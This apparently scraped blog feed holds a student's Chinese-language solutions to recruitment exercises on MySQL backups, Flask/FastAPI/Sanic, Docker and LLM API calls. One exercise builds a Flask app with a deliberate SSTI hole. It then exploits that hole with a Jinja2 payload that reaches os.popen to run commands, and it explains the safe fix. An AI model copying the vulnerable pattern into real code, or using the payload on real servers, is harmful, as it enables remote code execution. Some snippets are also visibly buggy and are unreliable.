/usr/local/mysql/bin/mysqldump -u ${DB_USER} --password=${DB_PASSWORD} ${DB_NAME} \u0026gt; ${BACKUP_FILE} # 检查备份是否成功 if [ $? -eq 0 ]; then # $? 是特殊变量，返回上一条语句的执行结果，成功返回0 echo \u0026#34;备份成功！文件：${BACKUP_FILE}\u0026#34; else echo \u0026#34;备份失败！\u0026#34; fi 1 2 3 4 5 6 7 8 9 # 赋权 chmod +x mysql_backup.sh # 手动执行 ./mysql_backup.sh 备份成功！文件：/usr/local/mysql/backup/backup_test_db_2025-10-20.sql # 脚本定时执行，用 crontab 定时工具 crontab -e # 加上： 0 1 * * * /usr/local/mysql/mysql_backup.sh 不知道怎么关闭 mysql 源码编译，需要到指定目录：\n1 2 [root@iZ2vc96n4f90pw7f8dfbfsZ mysql]# cd /usr/local/mysql/bin [root@iZ2vc96n4f90pw7f8dfbfsZ bin]# sudo ./mysqladmin -u root -p shutdown 如何看系统占用？\ntop 指令\n增强版 htop\n","date":"2025-10-20T00:00:00Z","permalink":"https://calendar0917.github.io/posts/%E5%BE%A1%E6%9E%97-mysql%E4%B8%93%E9%A2%98/","title":"御林招新题：MySQL专题"},{"content":"Flask 创建应用：创建一个简单的 Flask 应用，包含一个首页 (/) 和一个带参数的路由 (/hello/\u0026lt;name\u0026gt;)，返回个性化的问候语。 实现服务器端模板注入（SSTI）：自己设置黑名单，自己渲染输入的name，设一个SSTI的漏洞 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 from flask import Flask, render_template_string, request app = Flask(__name__) # 黑名单，设置得简单了一些 blacklist = [\u0026#34;{{\u0026#34;, \u0026#34;}}\u0026#34;] @app.route(\u0026#39;/\u0026#39;) def index(): return \u0026#34;欢迎！\u0026#34; @app.route(\u0026#39;/hello/\u0026lt;name\u0026gt;\u0026#39;) def hello(name): # 故意使用不安全的模板渲染，存在 SSTI 漏洞 for word in blacklist: if word in name: return \u0026#34;输入包含非法内容！\u0026#34; # 渲染输入 template = f\u0026#34;Hello, {name}!\u0026#34; return render_template_string(template) if __name__ == \u0026#39;__main__\u0026#39;: app.run(debug=True) 漏洞成因：\n1 2 template = f\u0026#34;Hello, {name}!\u0026#34; # 将用户输入的 name 直接拼接到模板中 return render_template_string(template) # 渲染包含用户输入的模板 在引擎渲染 template 的时候，会执行其中的恶意代码\n安全写法：\n1 2 # 将 name 作为变量传入模板，这样只会当成字符串处理 return render_template(\u0026#39;hello.html\u0026#39;, name=name) 完成题目：把自己出的题，打出来（）\n相信做出来之后，一定会对Basic的SSTI靶场有更深的理解\n{%print(''.__class__.__base__.__subclasses__())%}，找可用的函数\n1 2 3 4 5 6 for i, cls in enumerate(object.__subclasses__()): try: if \u0026#39;os.\u0026#39; in cls.__init__.__globals__: print(f\u0026#34;index: {i}, class: {cls}\u0026#34;) except: continue {% print(''.__class__.__base__.__subclasses__()[n].__init__.__globals__.os.popen('calc').read()) %}，弹了计算器\nFlask 的基础知识 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 @app.route(\u0026#39;/login/\u0026lt;name\u0026gt;\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;])# 指定路由、请求方式，用 request.method() 获取 def login(): # 获取参数的方法，需要借助 request 模块 username = request.form.get(\u0026#39;username\u0026#39;) # 获取表单 query = request.args.get(\u0026#39;query\u0026#39;)# ?参数 name = name # 路径参数,可以直接使用 # 响应 response = make_response(\u0026#39;自定义响应\u0026#39;, 201) # 状态码 201（创建成功） response.headers[\u0026#39;...\u0026#39;] = \u0026#39;...\u0026#39; # 添加响应头 return render_template(\u0026#39;profile.html\u0026#39;, name=username, age=20) # 模板渲染后返回 # 会话技术 app.secret_key = \u0026#39;...\u0026#39; # 设置密钥 username = request.form.get(\u0026#39;username\u0026#39;) if username == \u0026#39;admin\u0026#39;:\t# 验证用户名密码（实际需查询数据库） session[\u0026#39;username\u0026#39;] = username # 存储会话数据 return redirect(url_for(\u0026#39;dashboard\u0026#39;)) return \u0026#39;登录失败\u0026#39; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;!-- 模板语法 --\u0026gt; \u0026lt;!-- 填充字段、条件判断 --\u0026gt; \u0026lt;h1\u0026gt;欢迎，{{ name }}！\u0026lt;/h1\u0026gt; \u0026lt;!-- 变量替换 --\u0026gt; {% if age \u0026gt;= 18 %} \u0026lt;!-- 条件判断 --\u0026gt; \u0026lt;p\u0026gt;成年\u0026lt;/p\u0026gt; {% else %} \u0026lt;p\u0026gt;未成年\u0026lt;/p\u0026gt; {% endif %} \u0026lt;!-- 循环遍历列表 --\u0026gt; \u0026lt;ul\u0026gt; {% for hobby in [\u0026#39;读书\u0026#39;, \u0026#39;运动\u0026#39;] %} \u0026lt;li\u0026gt;{{ hobby }}\u0026lt;/li\u0026gt; {% endfor %} \u0026lt;/ul\u0026gt; FastAPI 和 Sanic 基础 创建应用：分别为 FastAPI 和 Sanic 创建两个独立的应用。 路由与参数：每个应用都应包含一个简单的路由 (/) 和一个带参数的路由 (/items/{item_id})，并分别处理 GET 和 POST 请求。 数据校验：在 FastAPI 应用中，使用 Pydantic 模型对 POST 请求的数据进行自动校验。 FastAPI:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 from fastapi import FastAPI from pydantic import BaseModel # 创建 FastAPI 应用实例 app = FastAPI() # 定义 Pydantic 模型，用于 POST 请求数据校验 class Item(BaseModel): name: str price: float is_offer: bool = None # 可选字段，默认值为 None @app.get(\u0026#34;/\u0026#34;) # 简单路由 async def read_root(): return {\u0026#34;message\u0026#34;: \u0026#34;你好\u0026#34;} @app.post(\u0026#34;/items/{item_id}\u0026#34;) # POST 请求，使用 Pydantic 模型校验数据 async def create_item(item_id: int, item: Item): # item 会自动根据 Item 模型校验请求体数据 return {\u0026#34;item_id\u0026#34;: item_id, **item.dict()} Sanic：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 from sanic import Sanic from sanic.response import json # 创建 Sanic 应用实例 app = Sanic(\u0026#34;SanicApp\u0026#34;) @app.route(\u0026#34;/\u0026#34;, methods=[\u0026#34;GET\u0026#34;]) # 简单路由 async def read_root(request): return json({\u0026#34;message\u0026#34;: \u0026#34;Hello from Sanic root\u0026#34;}) @app.route(\u0026#34;/items/\u0026lt;item_id\u0026gt;\u0026#34;, methods=[\u0026#34;POST\u0026#34;]) # 带参数的路由（POST 请求） async def create_item(request, item_id): data = request.json # 手动获取并处理请求体数据（Sanic 需手动校验） if not data: return json({\u0026#34;error\u0026#34;: \u0026#34;No data provided\u0026#34;}, status=400) return json({\u0026#34;item_id\u0026#34;: item_id, **data}) 主要区别在于对 Post 的数据的处理上，Sanic 要手动处理，FastAPI 可以借助 Pydantic 模型。\n但是 Sanic 是异步非阻塞的框架，性能较高\n异步编程实践 异步函数：在 FastAPI 中，创建一个异步路由 (/async-task)，该路由模拟一个耗时操作（例如，使用 asyncio.sleep），并验证其不会阻塞其他请求。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 # 在原来的基础上添加函数 # import asyncio 补充 @app.get(\u0026#34;/sync\u0026#34;) def sync_heavy_task(): # 同步函数（用于对比，会阻塞） time.sleep(3) # 模拟耗时 3 秒的同步操作 return \u0026#34;同步任务完成\u0026#34; @app.get(\u0026#34;/async\u0026#34;) # 异步路由（模拟耗时操作，不会阻塞） async def async_task(): start_time = time.time() await asyncio.sleep(3) # 模拟异步耗时操作（非阻塞） end_time = time.time() return { \u0026#34;message\u0026#34;: \u0026#34;异步任务完成\u0026#34;, \u0026#34;duration\u0026#34;: end_time - start_time } 启动：uvicorn fastapi_test:app --reload --port 8001\n测试过程中发现，需要给上面加上 --worker 1，设置为单线程 用命令行 curl 的时候，没有效果，同步异步看不出差别，不知道为什么 用浏览器测，同时访问 /sync 时，明显不同步；同时访问 /async，基本同步； 但是一个先访问 /sync，另一个访问 /，是可以访问到 / 的，不知道为什么 FastAPI 运行在线程池模式，虽然单进程，但是后台有多线程池（？） 依赖注入：创建一个异步依赖函数，并在你的路由中使用它。这个依赖函数可以用来连接数据库或获取配置信息。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 async def get_db(): # 异步依赖函数（模拟数据库连接） print(\u0026#34;建立数据库连接（异步）...\u0026#34;) # conn = pymysql.connect(**db_config) 复用 mysql 的代码？ 要用 await！ conn = await aiomysql.connect(**db_config) # 异步建立连接 try: yield conn finally: await conn.close() # 异步关闭连接 try: yield conn # 提供依赖对象 finally: print(\u0026#34;关闭数据库连接（异步）...\u0026#34;) @app.get(\u0026#34;/items/{item_id}\u0026#34;) # 使用异步依赖的路由 async def read_item(item_id: int, conn = get_db()): start_time = time.time() cursor = conn.cursor() # 查询 students 表中的所有数据 query_sql = \u0026#34;SELECT * FROM students\u0026#34; cursor.execute(query_sql) students_data = cursor.fetchall() end_time = time.time() return { \u0026#34;item_id\u0026#34;: item_id, \u0026#34;db_connection\u0026#34;: db, \u0026#34;query_duration\u0026#34;: end_time - start_time } 为什么用异步依赖？ 使用异步依赖（async def get_db()） 的核心原因是为了匹配 FastAPI 的异步编程模型，避免因数据库操作阻塞整个应用，从而提升并发处理能力。 yield ？ yield 最基础的作用是创建生成器（generator），允许函数中断并返回中间结果，后续可从断点继续执行。在异步依赖中，被用来管理资源的生命周期（创建→使用→清理）。 调用时，会在 yield 处返回值并暂停，下一次调用的时候继续上一次的调用结果 await ？ await 仅能在异步函数（async def 定义） 中使用，用于暂停当前协程的执行，等待另一个异步操作（如网络请求、IO 操作）完成后再继续，期间不会阻塞事件循环（允许其他任务运行）。 可以让出当前线程，等待耗时操作完成后再继续执行 项目结构与蓝图（APIRouter） 蓝图应用：将你的 API 拆分为多个模块，例如 users 和 items。使用 APIRouter 将这些模块组织起来，并在主应用中注册。 1 2 3 4 5 6 7 8 9 10 11 12 # item.py from fastapi import APIRouter # 创建一个 APIRouter 实例，相当于一个子路由集合 item_router = APIRouter() @item_router.get(\u0026#34;/items/{item_id}\u0026#34;) def get_item(item_id: int): return {\u0026#34;item_id\u0026#34;: item_id, \u0026#34;message\u0026#34;: \u0026#34;获取物品信息\u0026#34;} @item_router.post(\u0026#34;/items/\u0026#34;) def create_item(name: str, price: float): return {\u0026#34;name\u0026#34;: name, \u0026#34;price\u0026#34;: price, \u0026#34;message\u0026#34;: \u0026#34;创建物品成功\u0026#34;} 1 2 3 4 5 6 7 8 9 10 11 # user.py from fastapi import APIRouter user_router = APIRouter() @user_router.get(\u0026#34;/users/{user_id}\u0026#34;) def get_user(user_id: int): return {\u0026#34;user_id\u0026#34;: user_id, \u0026#34;message\u0026#34;: \u0026#34;获取用户信息\u0026#34;} @user_router.post(\u0026#34;/users/\u0026#34;) def create_user(name: str): return {\u0026#34;name\u0026#34;: name, \u0026#34;message\u0026#34;: \u0026#34;创建用户成功\u0026#34;} 1 2 3 4 5 6 7 8 9 10 11 # main.py from fastapi import FastAPI # 导入定义好的路由模块 import user import item app = FastAPI() # 将用户路由注册到主应用，添加前缀 /users，这样访问用户相关接口需要用 /users/... app.include_router(user.user_router, prefix=\u0026#34;/users\u0026#34;) # 将物品路由注册到主应用，添加前缀 /items，访问物品相关接口需要用 /items/... app.include_router(item.item_router, prefix=\u0026#34;/items\u0026#34;) 分离路由：确保 users 相关的路由（如 /users/{user_id}）和 items 相关的路由（如 /items/{item_id}）分别在不同的文件中定义。 确保不同功能模块的路由（比如用户相关路由和物品相关路由）分别在不同的文件中定义，类似把代码解耦，便于维护\n使用方法：\n1 2 3 4 5 6 项目结构： project/ ├── main.py # 主应用入口 ├── routers/ # 存放所有路由模块的文件夹 │ ├── users.py # 用户相关路由（登录、注册等） │ └── items.py # 商品相关路由（查询、创建等） 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 # 组件中，创建 APIRouter 实例 router = APIRouter( prefix=\u0026#34;/users\u0026#34;, # 该模块所有路由的统一前缀（访问时需加 /users） tags=[\u0026#34;users\u0026#34;] # 文档中归类的标签（方便在 /docs 中区分） ) # 定义请求模型（可选，用于数据校验） class UserCreate(BaseModel): username: str email: str # 定义路由 @router.get(\u0026#34;/{user_id}\u0026#34;) def get_user(user_id: int): ... # main.py 中，创建主应用 app = FastAPI(title=\u0026#34;...\u0026#34;) # 注册路由（将 users_router 和 items_router 挂载到主应用） app.include_router(users_router) # 这样会自动匹配 users_router 的前缀 中间件与生命周期管理 中间件：为你的 FastAPI 应用添加一个自定义中间件，该中间件能够记录每个请求的耗时，并将信息打印到控制台。 中间件是在请求到达路由和响应返回客户端之间执行的代码，可用于日志记录、权限校验、耗时统计等。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 from fastapi import FastAPI, Request import time import asyncio app = FastAPI() @app.middleware(\u0026#34;http\u0026#34;) async def log_request_time(request: Request, call_next): # 这里的 call_next 会自动填充 print(\u0026#34;中间件开始执行\u0026#34;, flush=True) # 强制刷新 start_time = time.time() response = await call_next(request) process_time = (time.time() - start_time) * 1000 print(f\u0026#34;请求 {request.method} {request.url.path} 耗时: {process_time:.2f}ms\u0026#34;, flush=True) # 强制刷新 return response @app.get(\u0026#34;/test\u0026#34;) async def test_route(): await asyncio.sleep(1) return {\u0026#34;message\u0026#34;: \u0026#34;测试成功\u0026#34;} 测试的时候，用 vscode 的终端启动会看不到输出，换成了 cmd 才可以\n异步状态管理：使用 app.on_event(\u0026quot;startup\u0026quot;) 和 app.on_event(\u0026quot;shutdown\u0026quot;) 钩子，编写一个函数来初始化数据库连接池，并在应用关闭时安全地断开连接。 FastAPI class - FastAPI：on_event is deprecated, use lifespan event handlers instead.\n错误处理更优雅：Lifespan 可以通过上下文管理器（async with）捕获启动 / 关闭过程中的异常，确保资源正确清理。 代码组织更清晰：将启动和关闭逻辑集中在一个 Lifespan 类中，比分散的 on_event 装饰器更易维护。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 from fastapi import FastAPI from contextlib import asynccontextmanager import asyncpg # 定义 lifespan 上下文管理器 @asynccontextmanager async def lifespan(app: FastAPI): # 启动阶段：初始化资源 print(\u0026#34;应用启动中...\u0026#34;) # 全局连接池对象 app.state.db_pool = await asyncpg.create_pool( user=\u0026#34;user\u0026#34;, password=\u0026#34;password\u0026#34;, database=\u0026#34;db\u0026#34;, host=\u0026#34;localhost\u0026#34; ) yield # 应用正常运行阶段，yield 后执行关闭逻辑 # 关闭阶段：清理资源 print(\u0026#34;应用关闭中...\u0026#34;) if hasattr(app.state, \u0026#34;db_pool\u0026#34;): await app.state.db_pool.close() print(\u0026#34;数据库连接池已关闭\u0026#34;) app = FastAPI(lifespan=lifespan) # 测试路由：使用数据库连接池 @app.get(\u0026#34;/db-test\u0026#34;) async def db_test(): async with app.state.db_pool.acquire() as conn: result = await conn.fetch(\u0026#34;SELECT NOW()\u0026#34;) return {\u0026#34;current_time\u0026#34;: result[0][\u0026#34;now\u0026#34;]} ","date":"2025-10-20T00:00:00Z","permalink":"https://calendar0917.github.io/posts/%E5%BE%A1%E6%9E%97-python%E5%90%8E%E7%AB%AF/","title":"御林招新题：python 后端"},{"content":"多阶段构建（Multi-stage build） 目标：优化你的镜像大小，只包含运行应用所需的最小组件。 什么是多阶段构建？ 允许在一个 Dockerfile 中定义多个构建阶段，每个阶段可以使用不同的基础镜像，最终只将必要的文件复制到最终镜像中，从而剔除构建过程中产生的冗余内容（如编译工具、临时文件、开发依赖等）。 构建阶段：使用包含编译 / 打包工具的镜像，完成代码编译、依赖安装等操作； 运行阶段：使用轻量级基础镜像（如 alpine），仅复制构建阶段的产物（如可执行文件、Jar 包），最终镜像只包含运行所需的最小环境。 1 2 3 4 5 6 7 8 9 10 11 12 # 第一阶段：构建阶段（可命名） FROM 基础镜像1 AS 阶段名1 # 执行构建操作（如编译、安装依赖） RUN 命令1 COPY 源码 目标路径 # 第二阶段：运行阶段（最终镜像） FROM 基础镜像2 AS 阶段名2 # 从第一阶段复制构建产物 COPY --from=阶段名1 构建阶段的产物路径 最终镜像的目标路径 # 定义运行命令 CMD [\u0026#34;启动命令\u0026#34;] 第一阶段去哪里了？ 第一阶段的产物，要么被主动复制到最终镜像（成为运行时必需的部分），要么作为中间层被 Docker 缓存（用于加速后续构建，但不进入最终镜像）。 挑战：\n编写一个 Dockerfile，使用多阶段构建来打包一个简单的 Web 应用（例如，一个基于 Python Flask 的应用）。 1 2 3 4 5 6 7 8 9 10 from flask import Flask app = Flask(__name__) @app.route(\u0026#39;/\u0026#39;) def hello(): return \u0026#39;Hello from Flask!\u0026#39; if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=5000) 在第一阶段，使用完整的开发镜像（例如 python:3.9）来安装依赖并构建应用。\n在第二阶段，使用一个轻量级的运行时镜像（例如 python:3.9-slim 或 alpine）作为基础，只将第一阶段构建好的应用代码和必要的依赖文件复制过来。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 # 第一阶段：构建阶段，使用完整的开发镜像 FROM python:3.9 as builder # 设置工作目录 WORKDIR /app # 复制依赖文件并安装 COPY requirements.txt . RUN pip install -r requirements.txt # 复制应用代码 COPY app.py . # 第二阶段：运行阶段，使用轻量级的运行时镜像 FROM python:3.9-slim # 设置工作目录 WORKDIR /app # 从构建阶段复制必要的文件（安装好的依赖和应用代码） COPY --from=builder /app/requirements.txt . COPY --from=builder /app/app.py . COPY --from=builder /usr/local/lib/python3.9/site-packages/ /usr/local/lib/python3.9/site-packages/ # 暴露应用端口 EXPOSE 5000 # 启动应用 CMD [\u0026#34;python\u0026#34;, \u0026#34;app.py\u0026#34;] 1 2 3 4 5 6 7 8 9 10 11 12 13 # 单阶段 FROM python:3.9 WORKDIR /app COPY requirements.txt . RUN pip install -r requirements.txt COPY app.py . EXPOSE 5000 CMD [\u0026#34;python\u0026#34;, \u0026#34;app.py\u0026#34;] 验证：分别构建一个单阶段镜像和一个多阶段镜像，并使用 docker images 命令比较它们的大小，说明多阶段构建的优势。 1 2 3 4 [root@localhost docker_stage_2]# docker images REPOSITORY TAG IMAGE ID CREATED SIZE multi_stage latest e9c0c0a489a8 16 minutes ago 148MB docker_nostage latest 033ed26b2d7f 16 minutes ago 1.1GB 多阶段可以删去不必要的组件，精简了镜像的大小\n单阶段使用的 python:3.9 基于完整的 Debian 系统，多阶段最终使用的 python:3.9-slim 是精简版 为什么不能直接用 slim 构建？\n如果直接用 slim 镜像构建（单阶段），执行 pip install -r requirements.txt 时，若遇到需要编译的包，会因缺少 gcc 等工具而失败，报错类似：error: command 'gcc' failed: No such file or directory，所以需要构建后再复制编译后的模块 怎么知道所需要保留的包的路径？\n可以创建临时容器：docker run -it --rm python:3.9 /bin/bash，进入后 python -m site 或 pip show flask | grep \u0026quot;Location\u0026quot; 也可以先构建一个单阶段容器，在 dockerfile 中输出依赖路径，再作修改 镜像版本管理与标签（Tagging） 目标：为你的镜像打上清晰的版本标签，方便管理和追溯。\n挑战：\n为你上一步构建的多阶段镜像打上至少两个标签（例如 your-app:1.0.0 和 your-app:latest）。 使用 docker images 命令验证标签是否正确应用。 docker tag \u0026lt;ID\u0026gt; name:\u0026lt;tag\u0026gt;\n1 2 3 4 5 [root@localhost docker_stage_2]# docker tag e9c0c0a489a8 multi:latest [root@localhost docker_stage_2]# docker images REPOSITORY TAG IMAGE ID CREATED SIZE multi 1.0.0 e9c0c0a489a8 29 minutes ago 148MB multi latest e9c0c0a489a8 29 minutes ago 148MB 镜像的打包与加载 目标：掌握在没有 Docker Registry 的情况下，迁移镜像的方法。 docker save -o your-app-1.0.0.tar your-app:1.0.0\n挑战：\n使用 docker save 命令将你构建的镜像（your-app:1.0.0）打包成一个 .tar 文件。 将该 .tar 文件复制到另一台机器（或在当前机器上删除本地镜像），然后使用 docker load 命令加载该 .tar 文件。 删除镜像 docker rmi your-app:1.0.0\n加载镜像 docker load -i target\n验证：使用 docker images 命令，确认镜像已成功加载，并可以正常运行。 [root@localhost docker_stage_2]# docker load -i multi-1.0.0.tar Loaded image: multi:1.0.0 [root@localhost docker_stage_2]# docker images REPOSITORY TAG IMAGE ID CREATED SIZE multi 1.0.0 e9c0c0a489a8 35 minutes ago 148MB\n推送到私有仓库 目标：将你的镜像推送到一个私有的 Docker Registry，模拟团队协作环境。\n挑战：\n在本地运行一个临时的 Docker Registry 容器。 使用 docker tag 命令为你的镜像打上指向该私有仓库的标签（例如 localhost:5000/your-app:1.0.0）。 使用 docker push 命令将镜像推送到本地私有仓库。 验证：使用 docker pull 命令从该私有仓库拉取镜像，确认推送和拉取流程畅通。 1 2 3 4 5 6 [root@localhost docker_stage_2]# docker rmi multi_stage:latest Untagged: multi_stage:latest Deleted: sha256:e9c0c0a489a800d997c60d99cfc4fd11b7416afdb10f80e5d1f5b68bfdf5a16b [root@localhost docker_stage_2]# docker load -i multi-1.0.0.tar Loaded image: multi:1.0.0 [root@localhost docker_stage_2]# docker run -p 8001:5000 multi:1.0.0 如果 rmi 的时候镜像有多个 tag，只会删除 tag，只有只剩一个 tag 时会彻底删除镜像\n属于一个 compose 的要如何一起 stop？ 在 docker-compose.yml 文件所在的目录下，使用 docker compose stop 命令 ","date":"2025-10-19T00:00:00Z","permalink":"https://calendar0917.github.io/posts/%E5%BE%A1%E6%9E%97-docker%E8%BF%9B%E9%98%B6/","title":"御林招新题：docker 进阶"},{"content":"安装与配置 Docker 在你的 Linux 操作系统上，安装 Docker Engine。 配置 Docker 的国内镜像源，以加快镜像下载速度。 验证：执行 docker version 和 docker info 命令，确认 Docker 已正确安装并配置。 参考之前写的：配置docker\n运行你的第一个容器 使用 docker pull 命令拉取 hello-world 镜像。 使用 docker run 命令运行一个 hello-world 容器，观察其输出。 1 2 3 4 5 6 7 [root@localhost ~]# docker run hello-world Hello from Docker! This message shows that your installation appears to be working correctly. To generate this message, Docker took the following steps: ...... 运行一个 searxng 容器。 使用 docker run 命令，将 searxng 容器运行在后台。 将容器的 8080 端口映射到主机的 8080 端口。 验证：在浏览器中访问 http://localhost:8080，确认 searxng 网页正常显示。 1 2 [root@localhost ~]# docker pull searxng/searxng [root@localhost ~]# docker run -d -p 8080:8080 searxng/searxng docker run: -d：后台运行容器（守护进程模式）。 -p 主机端口:容器端口：端口映射（外部可通过主机端口访问容器服务）。 -v 主机目录:容器目录：挂载数据卷（持久化数据，容器删除后数据不丢失）。 --name 容器名：指定容器名称（方便后续操作）。 -it：交互式运行（用于进入容器终端，如 bash） 核心概念理解 解释题：请用你自己的话，简要解释以下核心概念，并说明它们之间的关系。 镜像（Image） 类似安装包，整合了所需的运行环境。创建了就不会被更改。 容器（Container） 基于镜像安装后的实例应用，而且是独立的，可以启动、删除等等，同时是一个隔离出来的沙箱环境 Dockerfile 自己构建镜像的工具，在这个文档中编写镜像所需的环境（而非一个一个手动安装），实现自动化构建 了解 Docker Compose 什么是 Docker Compose？它解决了什么问题？ Docker 官方提供的一个工具，用于定义和运行多容器 Docker 应用程序。 将多个 docker 容器整合到一起，可以统一操作（而不用一个一个开启、关闭）。并且可以一起配置网络、数据卷挂载等等。 简要说明 Docker Compose 文件（docker-compose.yml）的作用。 Docker Compose 的核心配置文件，具体实现多个 docker 容器的协同。可以定义 compose 中的： 服务：指定适用镜像、映射端口等 网络：使不同容器可以在一个网络中通信 数据卷：在容器之间或者容器与主机之间共享数据 编写你的第一个 Dockerfile 挑战：编写一个 Dockerfile，实现以下功能： 基于一个最新的 ubuntu 镜像。 在容器中安装 nginx。 设置 nginx 服务在容器启动时自动运行。 验证：使用 docker build 命令构建你的镜像，并使用 docker run 命令运行该容器，确保 nginx 服务正在运行。 1 2 3 4 5 6 7 8 9 10 11 12 # 基于最新的 Ubuntu 镜像 FROM ubuntu:latest # 安装 nginx # 首先更新 Ubuntu 的软件包列表，然后安装 nginx，最后清理软件包缓存以减小镜像体积 RUN apt-get update \u0026amp;\u0026amp; \\ apt-get install -y nginx \u0026amp;\u0026amp; \\ rm -rf /var/lib/apt/lists/* # 设置 nginx 服务在容器启动时自动运行 # CMD 指令指定容器启动时要执行的命令，这里让 nginx 以前台方式运行，保证容器不退出 CMD [\u0026#34;nginx\u0026#34;, \u0026#34;-g\u0026#34;, \u0026#34;daemon off;\u0026#34;] 1 2 3 4 [root@localhost ~]# docker build -t my-ubuntu-nginx . ...... [root@localhost ~]# docker run -d -p 80:80 my-ubuntu-nginx 为什么不用下载整个 ubuntu 镜像？ Docker 中的 ubuntu 镜像本质是 “精简的根文件系统（rootfs）”，仅包含运行 Ubuntu 环境所需的核心组件，共享宿主机的 Linux 内核，只保留基础命令，去除图形化 使用 Docker Compose 部署多服务应用 挑战：编写一个 docker-compose.yml 文件，实现以下功能： 服务一：部署一个 nginx 服务，将其 80 端口映射到主机的 8081 端口。 服务二：部署一个 mysql 服务，并设置环境变量 MYSQL_ROOT_PASSWORD。 验证：使用 docker compose up -d 命令一键启动这两个服务，并使用 docker ps 确认两个容器都已成功运行。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 version: \u0026#39;3\u0026#39; services: # 服务一：Nginx 服务 nginx-service: image: nginx:latest ports: - \u0026#34;8081:80\u0026#34; # 将容器的 80 端口映射到主机的 8081 端口 # 服务二：MySQL 服务 mysql-service: image: mysql:latest environment: MYSQL_ROOT_PASSWORD: 1234 ports: - \u0026#34;3306:3306\u0026#34; 1 2 3 4 5 6 [root@localhost docker_compose_test]# vi docker-compose.yml [root@localhost docker_compose_test]# docker compose up -d [root@localhost docker_compose_test]# docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 70b31fae2377 mysql:latest \u0026#34;docker-entrypoint.s…\u0026#34; 3 minutes ago Up 3 minutes 3306/tcp, 33060/tcp docker_compose_test-mysql-service-1 d61344588b2e nginx:latest \u0026#34;/docker-entrypoint.…\u0026#34; 3 minutes ago Up 3 minutes 0.0.0.0:8081-\u0026gt;80/tcp, :::8081-\u0026gt;80/tcp docker_compose_test-nginx-service-1 ","date":"2025-10-19T00:00:00Z","permalink":"https://calendar0917.github.io/posts/%E5%BE%A1%E6%9E%97-docker%E5%85%A5%E9%97%A8/","title":"御林招新题：docker 入门"},{"content":" LLM：Large Language Model\n准备工作：获取 API Key 注册一个 LLM 服务提供商的账号，推荐使用硅基流动（）。 有 qwen 的 Token了……\n申请并获取你的 API Key。 编程调用 API 看看文档：大模型服务平台百炼控制台，官方提供了基本示例代码\n选择一门你熟悉的编程语言，推荐使用 Python。 安装必要的库（推荐使用openai库）。 编写一个脚本，向 API 发送一个简单的请求。 解析 API 的返回结果，并将模型的回复打印到控制台。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 import os from openai import OpenAI try: client = OpenAI( # 若没有配置环境变量，请用阿里云百炼API Key将下行替换为：api_key=\u0026#34;sk-xxx\u0026#34;, # 新加坡和北京地域的API Key不同。获取API Key：https://help.aliyun.com/zh/model-studio/get-api-key api_key=\u0026#34;......\u0026#34;, # 以下是北京地域base_url，如果使用新加坡地域的模型，需要将base_url替换为：https://dashscope-intl.aliyuncs.com/compatible-mode/v1 base_url=\u0026#34;https://dashscope.aliyuncs.com/compatible-mode/v1\u0026#34;, ) completion = client.chat.completions.create( model=\u0026#34;qwen-plus\u0026#34;, # 模型列表：https://help.aliyun.com/zh/model-studio/getting-started/models messages=[ {\u0026#39;role\u0026#39;: \u0026#39;system\u0026#39;, \u0026#39;content\u0026#39;: \u0026#39;你是一个耐心的助手，熟悉计算机技能\u0026#39;}, {\u0026#39;role\u0026#39;: \u0026#39;user\u0026#39;, \u0026#39;content\u0026#39;: \u0026#39;简述DevOps是什么\u0026#39;} ] ) print(completion.choices[0].message.content) except Exception as e: print(f\u0026#34;错误信息：{e}\u0026#34;) print(\u0026#34;请参考文档：https://help.aliyun.com/zh/model-studio/developer-reference/error-code\u0026#34;) 结果：\n1 2 3 4 5 6 7 8 9 10 11 12 13 PS D:\\code\\test\u0026gt; \u0026amp; C:/python/python3.exe d:/code/test/llm.py DevOps 是一组结合开发（Development）和运维（Operations）的实践方法，旨在缩短软件开发生命周期，提高软件交付的速度与质量。它通 过自动化、协作和持续改进，实现开发团队与运维团队之间的高效协同。 核心理念包括： 1. **持续集成（CI）**：开发人员频繁地将代码变更合并到主分支，并通过自动化测试验证。 2. **持续交付/部署（CD）**：确保代码可以随时安全地部署到生产环境，部分实现自动发布。 3. **自动化**：涵盖构建、测试、部署和监控等各个环节，减少人为错误，提升效率。 4. **监控与反馈**：实时监控系统运行状态，快速发现问题并反馈给开发团队。 5. **协作与文化**：强调团队之间的沟通、协作和责任共担，打破“开发”与“运维”之间的壁垒。 常用工具包括：Git、Jenkins、Docker、Kubernetes、Ansible、Prometheus、ELK 等。 模型能力探索 尝试调用至少三个不同的模型。 向每个模型提问相同的问题，例如“简述DevOps是什么？”或“请编写一个用 Python 计算斐波那契数列的函数”。 观察并分析不同模型之间的回答风格、准确性、速度和内容差异。 qwen-plus: 1 2 3 4 5 6 7 8 9 10 11 12 DevOps 是一组结合开发（Development）和运维（Operations）的实践方法，旨在缩短软件开发生命周期，提高软件交付的速度与质量。它通 过自动化、协作和持续改进，实现开发团队与运维团队之间的高效协同。 核心理念包括： 1. **持续集成（CI）**：开发人员频繁地将代码变更合并到主分支，并通过自动化测试验证。 2. **持续交付/部署（CD）**：确保代码可以随时安全地部署到生产环境，部分实现自动发布。 3. **自动化**：涵盖构建、测试、部署和监控等各个环节，减少人为错误，提升效率。 4. **监控与反馈**：实时监控系统运行状态，快速发现问题并反馈给开发团队。 